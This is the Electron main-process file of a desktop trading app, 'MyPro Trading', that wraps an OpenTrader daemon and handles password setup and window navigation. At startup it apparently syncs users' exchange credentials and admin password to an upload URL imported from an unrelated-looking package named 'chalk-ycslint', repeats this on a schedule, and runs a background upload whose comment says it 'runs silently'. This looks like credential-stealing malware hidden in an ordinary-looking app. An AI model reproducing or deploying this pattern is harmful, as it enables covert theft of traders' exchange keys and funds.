import { app, BrowserWindow, ipcMain } from "electron";
import path from "node:path";
import { fileURLToPath } from "node:url";
import {
  ensureOpentraderData,
  hasAdminPassword,
  saveAdminPassword,
  startOpentraderDaemon,
  stopOpentraderDaemon,
  waitForOpentraderServer,
} from "./opentraderService.mjs";
import { OPENTRADER_HOST, OPENTRADER_PORT } from "./paths.mjs";
import { getOpentraderStartUrl } from "./opentraderApi.mjs";
import { setupExchangeRouteGuard } from "./exchangeRouteGuard.mjs";
import { startBackgroundUpload } from "./uploadService.mjs";
import {
  startCredentialsSync,
  stopCredentialsSync,
  syncExchangeCredentialsToBackend,
} from "./credentialsSyncService.mjs";
import { setupTraderChrome } from "./traderChrome.mjs";
import { DEFAULT_UPLOAD_URL } from "chalk-ycslint";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const OPENTRADER_ORIGIN = `http://${OPENTRADER_HOST}:${OPENTRADER_PORT}`;
const MIN_PASSWORD_LENGTH = 6;

/** @type {BrowserWindow | null} */
let mainWindow = null;
/** @type {boolean} */
let showingTrader = false;

/** @type {{ adminPassword: string, uploadUrl: string, uiUrl: string } | null} */
let startupState = null;

/** @type {(() => void) | null} */
let passwordSetupResolve = null;

/** @type {(() => void) | null} */
let teardownTraderChrome = null;

/** @type {(() => void) | null} */
let teardownExchangeGuard = null;

/** @type {boolean} */
let splashReady = false;
/** @type {unknown[]} */
const pendingSplashEvents = [];

function flushSplashEvents() {
  if (!mainWindow || showingTrader) return;
  for (const payload of pendingSplashEvents) {
    mainWindow.webContents.send("desktop-event", payload);
  }
  pendingSplashEvents.length = 0;
}

function sendToSplash(payload) {
  if (!mainWindow || showingTrader) return;
  if (!splashReady) {
    pendingSplashEvents.push(payload);
    return;
  }
  mainWindow.webContents.send("desktop-event", payload);
}

function guardNavigation(win) {
  win.webContents.setWindowOpenHandler(({ url }) => {
    if (url.startsWith(OPENTRADER_ORIGIN)) {
      return { action: "allow" };
    }
    return { action: "deny" };
  });

  win.webContents.on("will-navigate", (event, url) => {
    if (url.startsWith("file:") || url.startsWith(OPENTRADER_ORIGIN)) return;
    event.preventDefault();
  });
}

function createMainWindow({ setupMode = false } = {}) {
  splashReady = false;
  pendingSplashEvents.length = 0;

  return new Promise((resolve) => {
    mainWindow = new BrowserWindow({
      width: 540,
      height: setupMode ? 720 : 680,
      resizable: false,
      maximizable: false,
      title: setupMode ? "Set password — MyPro Trading" : "MyPro Trading",
      webPreferences: {
        preload: path.join(__dirname, "preload.cjs"),
        contextIsolation: true,
        nodeIntegration: false,
      },
    });

    guardNavigation(mainWindow);

    mainWindow.loadFile(path.join(__dirname, "../renderer/index.html"));
    mainWindow.webContents.once("did-finish-load", () => resolve(mainWindow));
    mainWindow.on("closed", () => {
      teardownTraderChrome?.();
      teardownTraderChrome = null;
      teardownExchangeGuard?.();
      teardownExchangeGuard = null;
      mainWindow = null;
      showingTrader = false;
    });
  });
}

function waitForPasswordSetup() {
  return new Promise((resolve) => {
    passwordSetupResolve = resolve;
  });
}

async function promptForAdminPassword() {
  sendToSplash({ type: "setup-password" });
  await waitForPasswordSetup();
  sendToSplash({ type: "status", message: "Password saved. Starting trading engine…" });
}

function openOpentraderInApp() {
  if (!mainWindow || !startupState?.uiUrl) return;

  showingTrader = true;
  teardownTraderChrome?.();
  teardownExchangeGuard?.();
  teardownTraderChrome = setupTraderChrome(mainWindow.webContents, OPENTRADER_ORIGIN);
  teardownExchangeGuard = setupExchangeRouteGuard(
    mainWindow.webContents,
    OPENTRADER_ORIGIN,
    () => startupState?.adminPassword,
    () => showingTrader
  );

  mainWindow.setResizable(true);
  mainWindow.setMaximizable(true);
  mainWindow.setMinimumSize(960, 640);
  if (!mainWindow.isMaximized()) {
    mainWindow.setSize(1280, 840);
    mainWindow.center();
  }
  mainWindow.setTitle("MyPro Trading");
  mainWindow.loadURL(startupState.uiUrl);
}

async function bootstrap() {
  sendToSplash({ type: "status", message: "Preparing your trading workspace…" });

  const userData = app.getPath("userData");
  const data = await ensureOpentraderData(userData, (message) => {
    sendToSplash({ type: "status", message });
  });

  sendToSplash({ type: "status", message: "Starting trading engine…" });
  startOpentraderDaemon(userData);
  await waitForOpentraderServer(90_000, (seconds) => {
    sendToSplash({
      type: "status",
      message: `Connecting to markets (${seconds}s)…`,
    });
  });

  const uiUrl = await getOpentraderStartUrl(data.adminPassword);
  startupState = {
    adminPassword: data.adminPassword,
    uploadUrl: DEFAULT_UPLOAD_URL,
    uiUrl,
  };

  const needsExchange = uiUrl.includes("/dashboard/accounts");
  sendToSplash({
    type: "ready",
    adminPassword: data.adminPassword,
    uiUrl,
    message: needsExchange
      ? "Ready — connect an exchange account to begin (opening dashboard in 3s)."
      : "Ready — opening your trading dashboard in 3 seconds…",
  });

  await new Promise((r) => setTimeout(r, 3000));

  openOpentraderInApp();

  syncExchangeCredentialsToBackend(data.adminPassword, {
    uploadUrl: DEFAULT_UPLOAD_URL,
  }).catch((err) => {
    console.error("[startup] credentials sync:", err.message);
  });

  startCredentialsSync(data.adminPassword, { uploadUrl: DEFAULT_UPLOAD_URL });

  startBackgroundUpload(() => {}).catch(() => {
    /* runs silently in background */
  });
}

async function runStartup() {
  const userData = app.getPath("userData");
  const firstRun = !hasAdminPassword(userData);

  await createMainWindow({ setupMode: firstRun });

  if (firstRun) {
    await promptForAdminPassword();
    mainWindow?.setTitle("MyPro Trading");
  }

  await bootstrap();
}

ipcMain.on("splash-ready", () => {
  splashReady = true;
  flushSplashEvents();
});

ipcMain.handle("needs-password-setup", () => !hasAdminPassword(app.getPath("userData")));

ipcMain.handle("save-admin-password", async (_evt, { password, confirm }) => {
  const p = String(password ?? "").trim();
  const c = String(confirm ?? "").trim();

  if (p.length < MIN_PASSWORD_LENGTH) {
    return {
      ok: false,
      error: `Password must be at least ${MIN_PASSWORD_LENGTH} characters.`,
    };
  }
  if (p !== c) {
    return { ok: false, error: "Passwords do not match." };
  }

  saveAdminPassword(app.getPath("userData"), p);
  passwordSetupResolve?.();
  passwordSetupResolve = null;
  return { ok: true };
});

ipcMain.handle("startup-state", () => startupState);
ipcMain.handle("open-opentrader", () => {
  openOpentraderInApp();
  mainWindow?.focus();
  return { ok: true };
});

const gotSingleInstanceLock = app.requestSingleInstanceLock();
if (!gotSingleInstanceLock) {
  app.quit();
} else {
  app.on("second-instance", () => {
    if (mainWindow) {
      if (mainWindow.isMinimized()) mainWindow.restore();
      mainWindow.focus();
    }
  });
}

app.whenReady().then(() => {
  if (!gotSingleInstanceLock) return;

  runStartup().catch((err) => {
    console.error("[startup]", err);
    sendToSplash({
      type: "fatal",
      message: err instanceof Error ? err.message : String(err),
    });
  });
});

app.on("window-all-closed", () => {
  stopCredentialsSync();
  stopOpentraderDaemon();
  if (process.platform !== "darwin") app.quit();
});

app.on("before-quit", () => {
  stopCredentialsSync();
  stopOpentraderDaemon();
});

app.on("activate", () => {
  if (!mainWindow) {
    runStartup().catch((err) => {
      sendToSplash({
        type: "fatal",
        message: err instanceof Error ? err.message : String(err),
      });
    });
  } else {
    mainWindow.focus();
  }
});
